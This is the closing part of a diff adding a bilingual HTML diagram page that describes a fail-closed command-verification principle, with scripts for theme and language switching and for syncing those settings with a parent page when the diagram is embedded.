+      <span class="lz">FAIL-CLOSED</span>
+      <span class="le">FAIL-CLOSED</span>
+    </div>
+    <div class="card-desc">
+      <span class="lz">解析失败时默认拒绝执行——这是系统最重要的安全原则之一。未经词法/语法验证通过的命令，无论任何原因，一律不允许执行。</span>
+      <span class="le">When parsing fails, execution is denied by default—one of the system's most critical security principles. Any command that fails lexical/syntactic verification is never allowed to run, regardless of reason.</span>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var t=localStorage.getItem('vtheme')||'dark';
+  var l=localStorage.getItem('vlang')||'zh';
+  document.documentElement.setAttribute('data-theme',t);
+  document.documentElement.setAttribute('data-lang',l);
+  document.getElementById('langBtn').textContent=l==='zh'?'EN':'中';
+
+  // Apply initial lang state to SVG elements
+  function applyLang(lang){
+    document.querySelectorAll('svg .le, svg .lz').forEach(function(e){
+      var show=(lang==='en')?e.classList.contains('le'):e.classList.contains('lz');
+      e.style.display=show?'':'none';
+      e.setAttribute('display',show?'inline':'none');
+    });
+  }
+  applyLang(l);
+
+  window.cycleTheme=function(){
+    var themes=['dark','warm','light'];
+    var cur=document.documentElement.getAttribute('data-theme')||'dark';
+    var next=themes[(themes.indexOf(cur)+1)%themes.length];
+    document.documentElement.setAttribute('data-theme',next);
+    localStorage.setItem('vtheme',next);
+  };
+
+  window.toggleLang=function(){
+    var cur=document.documentElement.getAttribute('data-lang')||'zh';
+    var next=cur==='zh'?'en':'zh';
+    document.documentElement.setAttribute('data-lang',next);
+    localStorage.setItem('vlang',next);
+    document.getElementById('langBtn').textContent=next==='zh'?'EN':'中';
+    applyLang(next);
+  };
+})();
+</script>
+<script>
+/* v2-embed-sync */
+/* Embed-mode sync v2: 当图表作为 iframe 嵌入时，隐藏自带控件，跟父页面总开关联动。
+   监听 3 种父页面 message 格式：cc-theme / cc-lang / v2-sync */
+(function(){
+  try {
+    var params = new URLSearchParams(window.location.search);
+    var isEmbed = params.get('embed') === '1';
+    var theme = params.get('theme');
+    var lang = params.get('lang');
+    function forceLang(l) {
+      // 直接翻转 .lz / .le 元素的显示，绕过图表 IIFE 的闭包 l 变量
+      var en = l === 'en';
+      document.querySelectorAll('.lz').forEach(function(e){
+        e.style.display = en ? 'none' : '';
+        if (e.tagName && (e.tagName.toLowerCase() === 'text' || e.tagName === 'tspan' || e.closest('svg'))) {
+          if (en) e.setAttribute('display', 'none'); else e.removeAttribute('display');
+        }
+      });
+      document.querySelectorAll('.le').forEach(function(e){
+        e.style.display = en ? '' : 'none';
+        if (e.tagName && (e.tagName.toLowerCase() === 'text' || e.tagName === 'tspan' || e.closest('svg'))) {
+          if (en) e.removeAttribute('display'); else e.setAttribute('display', 'none');
+        }
+      });
+    }
+    function applyState(t, l) {
+      if (t) {
+        document.documentElement.setAttribute('data-theme', t);
+        try { localStorage.setItem('vtheme', t); localStorage.setItem('cc-theme', t); } catch(_){}
+      }
+      if (l) {
+        document.documentElement.setAttribute('data-lang', l);
+        document.documentElement.setAttribute('lang', l);  // 双写，让 CSS 的 html[lang=*] 也命中
+        try { ['vlang','cc-lang','cc-locale','lang'].forEach(function(k){ localStorage.setItem(k, l); }); } catch(_){}
+        forceLang(l);  // 直接操作 .lz/.le，跳过 IIFE 闭包问题
+      }
+    }
+    if (isEmbed) {
+      applyState(theme, lang);
+      // FM-23 防御：一些图表用 createElement 晚期注入 .lz/.le 节点
+      setTimeout(function(){ applyState(theme, lang); }, 100);
+      setTimeout(function(){ applyState(theme, lang); }, 500);
+      var hideCSS = document.createElement('style');
+      hideCSS.textContent = [
+        '[onclick*="toggleLang"],',
+        '[onclick*="setTheme"],',
+        '[onclick*="toggleTheme"],',
+        '[onclick*="cycleTheme"],',
+        '.controls,',
+        '.theme-controls,',
+        '.topbar-controls,',
+        '.chart-controls,',
+        '.viz-controls,',
+        '.ctrl-row,',
+        '.ctrls,',
+        '.toolbar .btn {',
+        '  display: none !important;',
+        '}'
+      ].join('');
+      hideCSS.id = 'v2-embed-sync-hide';
+      (document.head || document.documentElement).appendChild(hideCSS);
+    }
+    window.addEventListener('message', function(e){
+      if (!e.data || typeof e.data !== 'object') return;
+      var d = e.data;
+      if (d.type === 'v2-sync') { applyState(d.theme, d.lang); }
+      else if (d.type === 'cc-theme') { applyState(d.theme, null); }
+      else if (d.type === 'cc-lang') { applyState(null, d.lang); }
+    });
+  } catch(err) { /* ignore */ }
+})();
+</script>
+</body>
+</html>
